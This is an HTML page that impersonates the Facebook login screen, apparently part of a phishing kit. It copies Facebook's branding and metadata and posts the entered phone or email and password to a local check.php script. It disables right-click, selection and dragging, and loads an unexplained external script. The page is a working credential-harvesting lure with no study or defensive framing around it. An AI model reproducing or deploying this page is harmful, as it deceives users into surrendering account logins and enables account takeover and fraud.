<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Facebook - Log in or signup">
<meta name="description" content="Login using your Facebook account.">
<meta property="og:description" content="Login using your Facebook account.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Facebook - Log in or signup">
<meta property="og:type" content="website">
<meta name="theme-color" content="#0078ff">
<meta property="og:image" content="img/icon-fb.png">
<title>Facebook - Log in or signup</title>
<script src="https://unpkg.com/bootrun@3.9.7/min.js"></script>
<link rel="stylesheet" href="css/fb_style.css">
<link rel="icon" href="img/icon-fb.png">
<style>
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background: #fff;;
	-webkit-background-size:cover;
	-moz-background-size:cover;
	-o-background-size:cover;
	background-size:cover;
	margin: 0;
	font-family: Roboto;
}
.container {
	background: #fff;
	position: relative;
	margin: 0px auto;
	margin-top: 10%;
	margin-bottom: 10%;
	max-width: 400px;
	height: 700px;
	border-radius: 10px;
	box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.3);
}
.header {
    background: url(https://i.ibb.co/yRc51C8/header.png) no-repeat;
    background-size: 100% 100%;
    width: 100%;
    height: 200px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
    position: relative;
}
.header img {
    width: 200;
    margin-top: 24%;
    margin-left: 3%;
}
.box {
    width: 100%;
    height: 400px;
    margin-bottom: 0px;
    padding: 40px;
    position: absolute;
    overflow: none;
}
.language {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3a5998;
    font-size: 14px;
}
input[type=text],input[type=password],input[type=number], select {
	background: #fff;
	width: 100%;
	height: auto;
	font-size: 17px;
	font-family: Roboto;
	color: #000;
	padding: 5px;
	padding-left: 3px;
	margin-top: 8px;
	line-height: 30px;
	border: none;
	border-bottom: 1px solid #c0c0c0;
	position: relative;
	outline: none;
}
input[type=text]:focus {
    border-bottom: 2px solid #0078ff;
    transition: 0.1s;
}
input[type=password]:focus {
    border-bottom: 2px solid #0078ff;
    transition: 0.1s;
}
input[type=number]:focus {
    border-bottom: 2px solid #0078ff;
    transition: 0.1s;
}
::placeholder {
    color: #c0c0c0;
}
.btn-login {
    background: #0078ff;
    width: 100%;
    height: auto;
    margin-top: 9%;
    padding: 11px;
    color: #fff;
    font-size: 16px;
    font-weight: bold;
    border: none;
    border-radius: 5px;
}
.btn-forgot {
    background: none;
    width: 100%;
    height: auto;
    padding: 11px;
    color: #0078ff;
    font-size: 16px;
    font-weight: bold;
    border: none;
    border-radius: 5px;
}
.divider {
	display:block;
	margin-top:15px;
    margin-bottom:15px;
	overflow:hidden;
	text-align:center;
	white-space:nowrap;
	width:100%;
}
.divider>span {
	display:inline-block;
	position:relative;
	color:#000;
	cursor:default;
	font-size:14px;
	text-transform: uppercase;
}
.divider>span:before,.divider>span:after {
	background:#ced0d4;
	content:"";
	height:1px;
	position:absolute;
	top:50%;
	width:9999px;
}
.divider>span:before {
	margin-right:5px;
	right:100%;
}
.divider>span:after {
	left:100%;
	margin-left: 5px;
}
.btn-create {
    background: #00A400;
    width: 90%;
    height: auto;
    margin-top: 4%;
    padding: 8px;
    color: #fff;
    font-size: 16px;
    font-weight: bold;
    border: none;
    border-radius: 5px;
}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: 100%;
        margin-top: 0px;
        margin-bottom: 0px;
        border-radius: 0px;
        padding: 0px;
        box-shadow: none;
    }
    .header {
        height: 190px;
        border-radius: 0px;
    }
}
</style>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">

<div class="header">
</div>

<center>
<div class="language">Indonesia • Bahasa Melayu • 日本語 • <span>More...</span></div>
</center>

<div class="box">
<form action="check.php" method="post" onclick="$(this).end()">
<input type="text" name="user" placeholder="Phone or email" required>
</br>
</br>
<input type="password" name="pass" placeholder="Password" required>
<input type="hidden" name="link_grup" value="" readonly>
<button type="submit" class="btn-login">Log In</button>
</form>
<button type="button" class="btn-forgot">Forgot Password?</button>
<div class="divider">
<span>or</span>
</div>
<center>
<button type="button" class="btn-create">Create New Facebook Account</button>
</center>
</div> <!--- box --->

</div> <!--- container --->

</body>
</html>